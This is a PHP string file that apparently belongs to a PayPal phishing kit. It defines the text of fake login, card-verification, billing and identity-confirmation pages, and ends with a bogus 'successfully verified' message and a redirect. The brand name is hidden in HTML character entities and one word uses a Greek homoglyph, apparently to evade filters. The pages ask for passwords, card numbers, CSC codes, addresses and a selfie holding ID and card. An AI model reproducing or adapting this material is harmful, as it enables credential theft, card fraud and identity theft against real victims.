<?php

session_start();
error_reporting(0); 
/////////// INDEX LOGIN ///////////////////////////////////////////
$Z118_01 = "Log in to your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Account";
$Z118_02 = "Email";
$Z118_03 = "Password";
$Z118_04 = "Email address is required.";
$Z118_05 = "Password is required.";
$Z118_06 = "Log In";
$Z118_07 = "Having trouble logging in?";
$Z118_08 = "Sign Up";
$Z118_09 = "Privacy";
$Z118_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$Z118_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$Z118_12 = "Checking your info…";
$Z118_13 = "Some of your info isn't correct. Please try again.";
/////////// INDEX BILLING/CARDING/SUCCESS //////////////////////////////////////////
$Z118_title         = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Safety & Security";
$Z118_securityLock  = "Your security is our top priority";
$Z118_verify        = "Verify your account";
$Z118_pargraphe     = "Dear ".$_SESSION['_login_email_'].", please enter your account information correctly, it should match your card information.";
$Z118_update_card   = "Verify Your Card Information";
$Z118_cardholder    = "Cardholder Name (As Printed On Card)";
$Z118_cardnumber    = "Card Number";
$Z118_expdate       = "Expiration Date";
$Z118_csc           = "CSC (3 digits)";
$Z118_update_bill   = "Verify Your Billing Address";
$Z118_fullname      = "Legal Full Name";
$Z118_address       = "Address Line";
$Z118_city          = "City";
$Z118_state         = "State";
$Z118_zipCode       = "Postal Code";
$Z118_mobile        = "Mobile";
$Z118_home          = "Home";
$Z118_phoneNumber   = "Phone Number";
$Z118_agree         = "By clicking Agree & Continue, you agree to &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;’s ";
$Z118_user_agrement = "User Agreement";
$Z118_privacy       = "Privacy Policy";
$Z118_and           = " and ";
$Z118_policy        = "Electronic Communications Delivery Policy";
$Z118_submit        = "Αgree & Continue";
$Z118_fPrivacy      = "Privacy";
$Z118_flegal        = "Legal";
$Z118_fHelpCenter   = "Help Center";
$Z118_success       = "Congratulations !";
$Z118_successp      = "Dear ".$_SESSION['_fullname_'].", your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; account has been successfully verified. You will be redirected automatically to login page in 5 seconds.";
$Z118_billing       = "Billing Address Information";
$Z118_carding       = " Card Information";
/////////// INDEX CONFIRM IDENTITY ////////////////////////////////////////// 
$Z118_id_title      = "Confirm your identity";
$Z118_id_parag      = "Uploading your documents will help us validate your identity.";
$Z118_id_ask        = "What should i do to confirm my identity?";
$Z118_id_li_1       = "Take a selfie by holding your ID and your Credit/Debit";
$Z118_id_li_2       = "Cardholder Name and ID must be match, clearly and visible.";
$Z118_id_li_3       = "Your documents must be next to your face.";
$Z118_id_example    = "Here's an example how the picture should be:";
?>